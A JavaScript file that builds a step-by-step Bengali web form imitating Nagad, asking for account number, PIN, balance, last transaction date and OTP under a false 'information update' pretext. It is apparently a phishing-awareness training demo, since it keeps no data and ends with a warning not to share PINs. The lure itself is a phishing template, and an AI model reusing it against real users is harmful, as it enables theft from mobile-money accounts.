const steps = [
  {
    title: " আপনার তথ্য হালনাগাদ করতে নিচের ঘরে সঠিক তথ্য পূরণ করুন ",
    description: "আপনার নগদ অ্যাকাউন্ট নম্বর লিখুন।",
    placeholder: "account number",
    type: "text"
  },
  {
    title: "Password / PIN",
    description: "নগদ বর্তামান PIN লিখুন।",
    placeholder: "PIN",
    type: "text"
  },
  
  {
    title: "Transaction & Balance",
    html: `
      <p>সর্বশেষ লেনদেনের তারিখ লিখুন</p>
      <input id="date" type="date">

      <p>আপনার বর্তমান ব্যালেন্স লিখুন।</p>
      <input id="balance" type="text" placeholder="12345">
    `
  },
  {
    title: "OTP Verification",
    description: "ভেরিফিকেশনের জন্য আপনার ফোনে ০৬ সংখ্যার ওটিপি পাঠানো হয়েছে, কল করে কেও কোড জানতে চাইলে তাকে ওটিপি প্রদান করা থেকে বিরত থাকুন।",
    placeholder: "123456",
    type: "text"
  }
];

let currentStep = 0;

const title = document.getElementById("title");
const content = document.getElementById("content");
const progress = document.getElementById("progress");
const progressBar = document.getElementById("progressBar");
const next = document.getElementById("next");
const back = document.getElementById("back");
const message = document.getElementById("message");

function showStep() {
  const step = steps[currentStep];
 
  back.disabled = currentStep === 0;

  title.textContent = step.title;
  progress.textContent = `STEP ${currentStep + 1} / ${steps.length}`;
  progressBar.style.width =
    `${((currentStep + 1) / steps.length) * 100}%`;
  message.textContent = "";

  if (step.html) {
    content.innerHTML = `
      <div class="demo-logo">
  <img src="images.png" alt="SafePay Logo">
  <p>SafePay Training Demo</p>
</div>
      ${step.html}
      <small>আপনার তথ্য যাছাই করা হচ্ছে।</small>
    `;
  } else {
    content.innerHTML = `
      <div class="demo-logo">
  <img src="images.png" alt="SafePay Logo">
  <p>SafePay Training Demo</p>
</div>
      <p>${step.description}</p>
      <input
        id="demoInput"
        type="${step.type}"
        placeholder="${step.placeholder}"
        autocomplete="off"
      >
      <small> নগদ এর সাথে থাকার জন্য ধন্নবাদ।</small>
    `;
  }
  next.textContent =
    currentStep === steps.length - 1 ? "verify" : "Continue";
  next.style.display = "inline-block";
}

back.addEventListener("click", function () {
  if (currentStep > 0) {
    currentStep--;
    showStep();
  }
});

next.addEventListener("click", function () {
  if (currentStep === 0 || currentStep === 1) {
    const input = document.getElementById("demoInput");

// Last Account Balance


  if (!input || !input.value.trim()) {
    message.textContent = "তথ্য লিখুন।";
    return;
    }
  }

// Last Transaction Date
if (currentStep === 2) {
  const date = document.getElementById("date");
  const balance = document.getElementById("balance");

  if (!date || !balance || !date.value || !balance.value.trim()) {
    message.textContent = "তথ্য পূরণ করুন।";
    return;
  }
      }
    if (currentStep < steps.length - 1) {
    currentStep++;
    showStep();
 } else {
    progress.textContent = "Verification COMPLETE";
    progressBar.style.width = "100%";
    title.textContent = "অনলাইন জুয়া এবং মানি লন্ডারিং প্রতিরোধে নগদ তথ্য হালনাগাদ 2026";

    content.innerHTML = `
      <div class="info">তথ্য হালনাগাদ প্রক্রিয়ার সফল হয়েছে।</div>
      <p>
        কখনো কোনো ব্যক্তির কাছে
        নিজের আসল PIN, পাসওয়ার্ড বা OTP দেবেন না।
      </p>
      <p>
        সন্দেহজনক লিংকে ব্যক্তিগত তথ্য দেওয়া থেকে বিরত থাকুন।
      </p>
    `;

    message.textContent = "";
    next.style.display = "none";
  }
});

showStep();
